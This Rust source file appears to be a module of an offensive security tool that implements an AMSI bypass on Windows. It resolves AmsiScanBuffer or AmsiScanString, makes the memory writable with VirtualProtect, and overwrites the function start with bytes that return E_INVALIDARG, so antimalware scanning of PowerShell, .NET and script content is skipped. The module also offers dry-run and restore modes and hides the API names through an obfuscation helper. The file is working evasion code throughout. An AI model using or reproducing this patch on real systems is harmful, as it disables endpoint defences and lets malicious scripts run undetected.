use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum AmsiTarget {
    AmsiScanBuffer,
    AmsiScanString,
}

impl AmsiTarget {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "amsiscanbuffer" | "scanbuffer" | "amsi" => Some(Self::AmsiScanBuffer),
            "amsiscanstring" | "scanstring" => Some(Self::AmsiScanString),
            _ => None,
        }
    }

    pub fn name(&self) -> String {
        match self {
            Self::AmsiScanBuffer => crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
            Self::AmsiScanString => crate::obf::s(crate::obf::AMSI_SCAN_STRING),
        }
    }

    pub fn dll(&self) -> String {
        crate::obf::s(crate::obf::AMSI_DLL)
    }

    pub fn patch_bytes(&self) -> Vec<u8> {
        let p = crate::obf::ba(&crate::obf::AMSI_PATCH);
        p.to_vec()
    }

    pub fn all() -> &'static [Self] {
        &[Self::AmsiScanBuffer, Self::AmsiScanString]
    }
}

pub struct PatchState {
    pub original_bytes: Vec<u8>,
    pub target: String,
    pub address: usize,
}

pub fn dry_run(target: &str, log: &LogSink) {
    let name: String = AmsiTarget::from_str(target).map_or_else(|| target.to_string(), |t| t.name());

    log.info(format!("[DRY RUN] AMSI Bypass — {name}"));
    log.detail(format!("  Target: {name} in amsi.dll"));
    log.detail("  Patch: B8 57 00 07 80 C3 (mov eax, E_INVALIDARG; ret)".to_string());
    log.detail("  Effect: AMSI scans return E_INVALIDARG — scanning is skipped".to_string());
    log.info(String::new());
    log.detail("  Steps that would execute:".to_string());
    log.detail("    [1/5] LoadLibraryA(\"amsi.dll\") — load AMSI DLL".to_string());
    log.detail(format!("    [2/5] GetProcAddress(amsi, \"{name}\") — resolve function"));
    log.detail("    [3/5] Save original 6 bytes".to_string());
    log.detail("    [4/5] VirtualProtect(PAGE_EXECUTE_READWRITE) — make writable".to_string());
    log.detail("    [5/5] Write patch bytes → restore original protection".to_string());
    log.info(String::new());
    log.warning("  AMSI (Antimalware Scan Interface) scans scripts, .NET assemblies,".to_string());
    log.warning("  and PowerShell before execution. Patching bypasses these scans.".to_string());
}

pub fn print_info(log: &LogSink) {
    log.info("=== AMSI Bypass ===".to_string());
    log.info(String::new());
    log.detail(
        "AMSI (Antimalware Scan Interface) is a Windows API that allows".to_string(),
    );
    log.detail("antivirus/EDR products to scan content before execution:".to_string());
    log.detail("  - PowerShell scripts".to_string());
    log.detail("  - .NET assemblies (Assembly.Load)".to_string());
    log.detail("  - VBScript / JScript".to_string());
    log.detail("  - Windows Script Host".to_string());
    log.info(String::new());
    log.detail("Patchable targets:".to_string());
    log.detail("  AmsiScanBuffer — primary scan function (checks raw bytes)".to_string());
    log.detail("  AmsiScanString — string variant (checks text content)".to_string());
    log.info(String::new());
    log.detail("Technique: overwrite the first 6 bytes with:".to_string());
    log.detail("  B8 57 00 07 80  mov eax, 0x80070057 (E_INVALIDARG)".to_string());
    log.detail("  C3              ret".to_string());
    log.detail("The function returns E_INVALIDARG, causing the AMSI consumer".to_string());
    log.detail("to skip the scan entirely. Original bytes are saved for restoration.".to_string());
}

#[cfg(windows)]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    use std::ffi::CString;
    use crate::resolve;

    #[link(name = "kernel32")]
    extern "system" {
        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *mut std::ffi::c_void;
    }

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let amsi_target = AmsiTarget::from_str(target)
        .ok_or_else(|| format!("unknown AMSI target: {target}"))?;
    let func_name = amsi_target.name();
    let dll_name = amsi_target.dll();
    let patch = amsi_target.patch_bytes();

    log.step(format!("[1/5] LoadLibraryA(\"...\")"));
    let dll_cstr = CString::new(dll_name.as_str())
        .map_err(|e| format!("invalid DLL name: {e}"))?;
    let dll_handle = unsafe { resolve::LoadLibraryA(dll_cstr.as_ptr() as *const u8) };
    if dll_handle.is_null() {
        return Err("LoadLibraryA failed — amsi.dll may not be available".to_string());
    }

    log.step(format!("[2/5] GetProcAddress(...)"));
    let func_cstr = CString::new(func_name.as_str())
        .map_err(|e| format!("invalid function name: {e}"))?;
    let func_addr = unsafe { GetProcAddress(dll_handle, func_cstr.as_ptr() as *const u8) };
    if func_addr.is_null() {
        return Err(format!("GetProcAddress failed: {func_name} not found in {dll_name}"));
    }
    let addr = func_addr as usize;
    log.detail(format!("  Address: 0x{addr:016X}"));

    log.step("[3/5] Saving original bytes".to_string());
    let mut original_bytes = vec![0u8; patch.len()];
    for (i, byte) in original_bytes.iter_mut().enumerate() {
        *byte = unsafe { *((addr + i) as *const u8) };
    }
    let hex: Vec<String> = original_bytes.iter().map(|b| format!("{b:02X}")).collect();
    log.detail(format!("  Original: {}", hex.join(" ")));

    log.step("[4/5] VirtualProtect → PAGE_EXECUTE_READWRITE".to_string());
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect (make writable) failed".to_string());
    }

    log.step("[5/5] Writing patch bytes → restoring protection".to_string());
    for (i, &byte) in patch.iter().enumerate() {
        unsafe {
            *((addr + i) as *mut u8) = byte;
        }
    }

    let mut discard: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            patch.len(),
            old_protect,
            &mut discard,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect (restore) failed".to_string());
    }

    let patch_hex: Vec<String> = patch.iter().map(|b| format!("{b:02X}")).collect();
    log.info(format!(
        "  ✓ {func_name} patched with [{}] — AMSI scans bypassed",
        patch_hex.join(" ")
    ));

    Ok(PatchState {
        original_bytes,
        target: func_name.to_string(),
        address: addr,
    })
}

#[cfg(windows)]
pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
    use crate::resolve;

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let addr = state.address;
    log.step(format!("[1/2] VirtualProtect → PAGE_EXECUTE_READWRITE (0x{addr:016X})"));

    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect (make writable) failed".to_string());
    }

    log.step("[2/2] Restoring original bytes".to_string());
    for (i, &byte) in state.original_bytes.iter().enumerate() {
        unsafe {
            *((addr + i) as *mut u8) = byte;
        }
    }

    let mut discard: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            old_protect,
            &mut discard,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect (restore) failed".to_string());
    }

    log.info(format!("  ✓ {} restored to original bytes", state.target));
    Ok(())
}

#[cfg(not(windows))]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    let amsi_target = AmsiTarget::from_str(target)
        .ok_or_else(|| format!("unknown AMSI target: {target}"))?;
    let _name = amsi_target.name();
    let _dll = amsi_target.dll();
    log.warning("  AMSI bypass requires Windows.".to_string());
    Err("AMSI bypass is only available on Windows".to_string())
}

#[cfg(not(windows))]
pub fn restore(_state: &PatchState, log: &LogSink) -> Result<(), String> {
    log.warning("  AMSI restore requires Windows.".to_string());
    Err("AMSI restore is only available on Windows".to_string())
}
